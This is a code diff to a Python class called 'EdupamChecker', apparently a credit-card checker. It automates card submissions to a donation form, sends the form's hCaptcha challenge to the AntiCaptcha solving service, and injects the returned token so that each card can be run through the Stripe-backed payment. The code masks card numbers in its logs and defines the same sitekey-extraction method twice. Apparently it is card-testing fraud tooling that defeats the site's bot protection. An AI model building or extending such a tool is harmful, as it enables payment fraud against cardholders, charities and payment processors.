@@ -784,54 +784,104 @@ class EdupamChecker:
         except Exception as e:
             logger.error(f"❌ Error extrayendo site-key: {e}")
             return None
-    
+        
+
+    def extract_hcaptcha_sitekey_from_visible_challenge(self, page):
+        """Extraer sitekey SOLO del iframe que contiene el desafío visible"""
+        
+        logger.info("🔍 Buscando iframe de DESAFÍO VISIBLE hCaptcha...")
+        
+        for frame in page.frames:
+            frame_url = frame.url.lower()
+            
+            # El iframe VISIBLE tiene 'captcha/v1' en la URL
+            if 'captcha/v1' in frame_url and 'hcaptcha.com' in frame_url:
+                logger.info(f"✅ IFRAME DE DESAFÍO VISIBLE encontrado")
+                logger.info(f"📄 URL: {frame.url[:200]}...")
+                
+                # Extraer sitekey
+                match = re.search(r'[?&]sitekey=([^&]+)', frame.url)
+                if match:
+                    site_key = match.group(1)
+                    logger.info(f"✅ SITEKEY DEL DESAFÍO VISIBLE: {site_key[:30]}...")
+                    return site_key, frame
+                
+                # Buscar también en parámetros encoded
+                match2 = re.search(r'sitekey%3D([^%&]+)', frame.url)
+                if match2:
+                    site_key = urllib.parse.unquote(match2.group(1))
+                    logger.info(f"✅ SITEKEY DEL DESAFÍO VISIBLE (encoded): {site_key[:30]}...")
+                    return site_key, frame
+        
+        logger.error("❌ NO se encontró iframe de desafío visible")
+        return None, None
+
+        
+    def extract_hcaptcha_sitekey_from_visible_challenge(self, page):
+        """Extraer sitekey SOLO del iframe que contiene el desafío visible"""
+        
+        logger.info("🔍 Buscando iframe de DESAFÍO VISIBLE hCaptcha...")
+        
+        for frame in page.frames:
+            frame_url = frame.url.lower()
+            
+            # El iframe VISIBLE tiene 'captcha/v1' en la URL
+            if 'captcha/v1' in frame_url and 'hcaptcha.com' in frame_url:
+                logger.info(f"✅ IFRAME DE DESAFÍO VISIBLE encontrado")
+                logger.info(f"📄 URL: {frame.url[:200]}...")
+                
+                # Extraer sitekey
+                match = re.search(r'[?&]sitekey=([^&]+)', frame.url)
+                if match:
+                    site_key = match.group(1)
+                    logger.info(f"✅ SITEKEY DEL DESAFÍO VISIBLE: {site_key[:30]}...")
+                    return site_key, frame
+                
+                # Buscar también en parámetros encoded
+                match2 = re.search(r'sitekey%3D([^%&]+)', frame.url)
+                if match2:
+                    site_key = urllib.parse.unquote(match2.group(1))
+                    logger.info(f"✅ SITEKEY DEL DESAFÍO VISIBLE (encoded): {site_key[:30]}...")
+                    return site_key, frame
+        
+        logger.error("❌ NO se encontró iframe de desafío visible")
+        return None, None
+
+
     def solve_captcha_if_present(self, page, card_last4):
-        """Detectar y resolver hCaptcha usando SOLO AntiCaptcha - SIN BYPASS MANUAL"""
+        """Detectar y resolver hCaptcha - VERSIÓN ESPECÍFICA PARA STRIPE VISIBLE"""
         try:
             time.sleep(3)
             
-            # ========== DETECCIÓN DE CAPTCHA ==========
+            # ========== DETECTAR SI HAY DESAFÍO VISIBLE ==========
             captcha_detected = False
             site_key = None
+            challenge_frame = None
             
-            # Verificar por iframes
+            # BUSCAR ESPECÍFICAMENTE el iframe de DESAFÍO VISIBLE
             for frame in page.frames:
-                if 'hcaptcha' in frame.url.lower():
+                frame_url = frame.url.lower()
+                
+                # El iframe con captcha/v1 ES el que muestra las imágenes
+                if 'captcha/v1' in frame_url and 'hcaptcha.com' in frame_url:
                     captcha_detected = True
-                    logger.info(f"🔍 hCaptcha detectado en iframe: {frame.url[:100]}...")
+                    challenge_frame = frame
+                    logger.info(f"✅ DESAFÍO VISIBLE DETECTADO")
+                    logger.info(f"📄 URL: {frame.url[:200]}...")
+                    
+                    # Extraer sitekey
+                    match = re.search(r'[?&]sitekey=([^&]+)', frame.url)
+                    if match:
+                        site_key = match.group(1)
+                        logger.info(f"✅ SITEKEY VISIBLE: {site_key[:30]}...")
                     break
             
-            # Verificar por texto en página
+            # Si no hay desafío visible, no hay captcha que resolver
             if not captcha_detected:
-                page_content = page.content().lower()
-                hcaptcha_indicators = [
-                    'hcaptcha',
-                    'i am human',
-                    'soy humano',
-                    'one more step',
-                    'select the checkbox'
-                ]
-                
-                if any(indicator in page_content for indicator in hcaptcha_indicators):
-                    captcha_detected = True
-                    logger.info("🔍 hCaptcha detectado por texto en página")
-            
-            # Si no hay captcha, salir
-            if not captcha_detected:
-                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
+                logger.info(f"✅ No se detectó desafío visible para ****{card_last4}")
                 return True
             
-            logger.info(f"🔍 hCaptcha detectado para ****{card_last4}")
-            
-            # ========== EXTRAER SITE-KEY ==========
-            logger.info("🔄 Extrayendo site-key...")
-            site_key = self.extract_hcaptcha_sitekey(page)
-            
-            if not site_key:
-                logger.error(f"❌ No se pudo extraer site-key para ****{card_last4}")
-                return False
-            
-            logger.info(f"✅ Site-key obtenido: {site_key[:30]}...")
+            logger.info(f"🔍 DESAFÍO VISIBLE detectado para ****{card_last4}")
             
             # ========== VERIFICAR API KEY ==========
             if not API_KEY_ANTICAPTCHA:
@@ -839,25 +889,26 @@ class EdupamChecker:
                 return False
             
             # ========== RESOLVER CON ANTI-CAPTCHA ==========
-            logger.info("🔄 Enviando a AntiCaptcha...")
+            logger.info("🔄 Enviando a AntiCaptcha (modo VISIBLE)...")
             
             try:
                 # Obtener user agent actual
                 user_agent = page.evaluate("navigator.userAgent")
                 
-                # Preparar tarea para AntiCaptcha
+                # CONFIGURACIÓN CORRECTA PARA DESAFÍO VISIBLE
                 task_data = {
                     "clientKey": API_KEY_ANTICAPTCHA,
                     "task": {
                         "type": "HCaptchaTaskProxyless",
-                        "websiteURL": page.url,
-                        "websiteKey": site_key,
+                        "websiteURL": page.url,  # URL de la página principal
+                        "websiteKey": site_key,  # Sitekey del iframe visible
                         "userAgent": user_agent,
-                        "isInvisible": True
+                        "isInvisible": False  # ⚠️ CRÍTICO: Es VISIBLE, no invisible
                     }
                 }
                 
-                # Enviar createTask
+                logger.info(f"📤 Enviando tarea con isInvisible=False")
+                
                 response = requests.post(
                     "https://api.anti-captcha.com/createTask",
                     json=task_data,
@@ -876,7 +927,7 @@ class EdupamChecker:
                 
                 # Esperar solución
                 solution = None
-                for i in range(30):  # 30 * 5 = 150 segundos máximo
+                for i in range(30):
                     time.sleep(5)
                     
                     get_result_data = {
@@ -896,11 +947,11 @@ class EdupamChecker:
                         if status_result.get("status") == "ready":
                             solution = status_result.get("solution", {}).get("gRecaptchaResponse")
                             if solution:
-                                logger.info(f"✅ hCaptcha resuelto con AntiCaptcha en {i*5} segundos")
+                                logger.info(f"✅ DESAFÍO VISIBLE resuelto en {i*5} segundos")
                                 break
                         
                         elif status_result.get("status") == "processing":
-                            logger.info(f"⏳ AntiCaptcha procesando... ({i+1}/30)")
+                            logger.info(f"⏳ AntiCaptcha procesando desafío visible... ({i+1}/30)")
                             continue
                         
                         else:
@@ -913,58 +964,74 @@ class EdupamChecker:
                         continue
                 
                 if not solution:
-                    logger.error(f"❌ No se pudo resolver el hCaptcha con AntiCaptcha")
+                    logger.error(f"❌ No se pudo resolver el desafío visible")
                     return False
                 
-                logger.info(f"✅ hCaptcha resuelto para ****{card_last4}")
+                logger.info(f"✅ DESAFÍO VISIBLE resuelto para ****{card_last4}")
                 
-                # ========== INYECTAR SOLUCIÓN ==========
+                # ========== INYECTAR SOLUCIÓN EN EL IFRAME CORRECTO ==========
                 try:
-                    page.evaluate("""
+                    # IMPORTANTE: La solución debe inyectarse en el iframe visible
+                    injection_result = challenge_frame.evaluate("""
                         (solution) => {
-                            console.log('🎯 Inyectando solución hCaptcha desde AntiCaptcha...');
+                            console.log('🎯 Inyectando solución en iframe de desafío visible...');
                             
-                            // Buscar campo existente
+                            // Buscar el campo de respuesta dentro del iframe
                             let field = document.querySelector('[name="h-captcha-response"]');
                             if (!field) {
                                 field = document.getElementById('h-captcha-response');
                             }
                             
-                            // Crear campo si no existe
-                            if (!field) {
-                                field = document.createElement('textarea');
-                                field.name = 'h-captcha-response';
-                                field.id = 'h-captcha-response';
-                                field.style.display = 'none';
-                                document.body.appendChild(field);
+                            if (field) {
+                                field.value = solution;
+                                field.dispatchEvent(new Event('input', { bubbles: true }));
+                                field.dispatchEvent(new Event('change', { bubbles: true }));
+                                console.log('✅ Solución inyectada en iframe visible');
+                                return true;
+                            } else {
+                                console.log('❌ No se encontró campo en iframe visible');
+                                return false;
                             }
-                            
-                            // Asignar solución
-                            field.value = solution;
-                            
-                            // Disparar eventos
-                            ['change', 'input'].forEach(eventType => {
-                                field.dispatchEvent(new Event(eventType, { bubbles: true }));
-                            });
-                            
-                            console.log('✅ Solución AntiCaptcha inyectada');
-                            return true;
                         }
                     """, solution)
                     
+                    logger.info(f"💉 Inyección en iframe visible: {injection_result}")
                     time.sleep(2)
                     
-                    # Re-enviar formulario
-                    submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
-                    if submit_btn.count() > 0:
-                        submit_btn.first.click()
-                        logger.info("🔄 Formulario reenviado después de inyectar captcha")
-                        time.sleep(5)
+                    # Stripe necesita comunicación entre iframes
+                    # Forzar que el iframe visible notifique al iframe invisible
+                    page.evaluate("""
+                        () => {
+                            // Buscar y notificar a Stripe
+                            if (window.hcaptcha) {
+                                window.hcaptcha.execute();
+                            }
+                            
+                            // Disparar evento personalizado
+                            const event = new CustomEvent('hcaptchaResponse', {
+                                detail: { response: arguments[0] }
+                            });
+                            window.dispatchEvent(event);
+                        }
+                    """, solution)
                     
-                    return True
+                    time.sleep(1)
+                    
+                    # ========== REENVIAR FORMULARIO ==========
+                    logger.info("🔄 Reenviando formulario...")
+                    
+                    submit_btn = page.locator('#btn-donation')
+                    if submit_btn.count() > 0:
+                        submit_btn.first.click(timeout=10000)
+                        logger.info("✅ Botón clickeado")
+                        time.sleep(5)
+                        return True
+                    else:
+                        logger.error("❌ Botón no encontrado")
+                        return False
                     
                 except Exception as e:
-                    logger.error(f"❌ Error inyectando solución: {e}")
+                    logger.error(f"❌ Error en inyección en iframe visible: {e}")
                     return False
                     
             except Exception as e:
@@ -974,6 +1041,7 @@ class EdupamChecker:
         except Exception as e:
             logger.error(f"❌ Error en solve_captcha_if_present: {e}")
             return False
+        
         
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta"""
